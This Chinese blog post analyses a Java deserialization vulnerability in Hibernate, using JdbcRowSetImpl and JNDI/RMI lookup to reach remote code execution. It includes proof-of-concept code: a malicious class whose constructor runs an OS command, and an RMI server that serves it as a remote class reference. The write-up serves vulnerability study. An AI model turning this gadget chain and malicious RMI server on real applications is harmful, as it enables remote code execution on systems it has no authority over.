---
layout: post  
title: "java反序列化漏洞-金蛇剑之hibernate(下)"  
date: 2018-1-26  
description: "java漏洞"  
tag: 漏洞分析
---
## 前言:
  金蛇剑:此剑金光灿烂形状奇特，剑身犹如是一条蛇盘曲而成。蛇尾构成剑尖蛇头藏与剑柄，握在手中甚是沉重，原是由黄金铸造而成。此剑形状甚是奇特，整柄剑就如是一条蛇盘曲而成，蛇尾勾成剑柄，蛇头则是剑尖，蛇舌伸出分叉，是以剑尖竟有两叉。
##  主角:
 hibernate
##  介绍:
  Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。曾几何时，java web程序员必备面试宝典,ssh(spring+struts2+hibernate)，当年笔者上javaweb课时，老师安利ssh,可见hibernate当年影响力多大。今天笔者跟着大家一起来学习分析hibernate的反序列化漏洞。
## 正文:
  接着上一篇写，其实这篇和上篇利用链区别不是很大，只是将TemplatesImpl用JdbcRowSetImpl替换，要想讲清楚这个，必须先要讲下JNDI,翻译过来为Java命令和目录接口。其中在2016年blackhat大会上，有个很详细ppt。[https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
  ![](http://pic.findbugs.top/18-2-7/5208562.jpg)
  其中rmi,dns，ldap等等都是  JNDI 具体的实现方式。这篇的主角JdbcRowSetImpl，就是实现了rmi。RMI全称是Remote Method Invocation－远程方法调用，Java RMI在JDK1.1中实现的，其威力就体现在它强大的开发分布式网络应用的能力上，是纯Java的网络分布式应用系统的核心解决方案之一。关于具体用法可以参考这篇文章，[http://blog.51cto.com/haolloyin/332426](http://blog.51cto.com/haolloyin/332426),[http://blog.51cto.com/6221123/1112619](http://blog.51cto.com/6221123/1112619)学习完这篇文章，我们明白，服务端开启一个rmi服务，客户端通过调用lookup函数，可以获取一个远程java对象。在调用lookup函数之后，客户端会调用服务端对于该对象的构造函数。那么一个攻击思路出来了，就是寻找不安全调用lookup去访问服务端恶意构造的一个rmi服务，并在服务端针对该服务绑定一个java类，在java类的构造函数中进行xxoo,[http://www.codersec.net/2017/09/Spring-%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/](http://www.codersec.net/2017/09/Spring-%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
  JdbcRowSetImpl是被封装在idk中的一个类，通过巧妙的调用该类，可以去访问一个恶意的rmi服务。换句话说，如果能控制JdbcRowSetImpl，所有的java应用必将带来灾难性的毁灭。JdbcRowSetImpl类中的connect函数中调用了lookup,通过反查，看到prepare，getDatabaseMetaData，setAutoCommit调了connect。其实这方面已经有很多分析文章，例如廖新喜师傅的[https://www.anquanke.com/post/id/87300](https://www.anquanke.com/post/id/87300),返回org.hibernate.property.BasicPropertyAccessor中BasicGetter类中get函数
  ![](http://pic.findbugs.top/18-2-7/448733.jpg)
  我们只需要将method改为prepare，getDatabaseMetaData，setAutoCommit三者任意一个，同时将target指定为JdbcRowSetImpl对象即可。构造一个恶意rim服务源码如下:
  
		public class EvilClass {
	    public EvilClass() throws Exception {
	        Runtime rt = Runtime.getRuntime();
	        String[] commands = {"open", "/Applications/Calculator.app/Contents/MacOS/Calculator"};
	        Process pc = rt.exec(commands);
	    }
		}
	
	public class EvilRmiServer {
    public static void main(String[] args){
        try {
            String serverAddress = "127.0.0.1";
            System.out.println("Start HTTP SERVER...");
            startHttpServer();
            System.out.println("Creating RMI Registry");
            registryRmi(serverAddress);
            //jndi的调用地址
            String jndiAddress = "rmi://"+serverAddress+":1099/Object";
            System.out.println(jndiAddress);
        } catch(Exception e) {
            e.printStackTrace();
        }

    }
    public static void startHttpServer() throws IOException {
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8088), 0);
        httpServer.createContext("/",new HttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();
    }
    public static void registryRmi(String serverAddress) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new javax.naming.Reference("EvilClass","EvilClass","http://"+serverAddress+":8088/");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("Object", referenceWrapper);

    }
	}

这里有一个很关键的地方，运行服务，并且调用lookup之后会提示类无法加载,其实是package的问题，上面的类，都不要放在任何packeage里面，直接根目录。执行的过程同上一篇文章，但是要将类换成JdbcRowSetImpl，函数getDatabaseMetaData。
![](http://pic.findbugs.top/18-2-7/67587264.jpg)
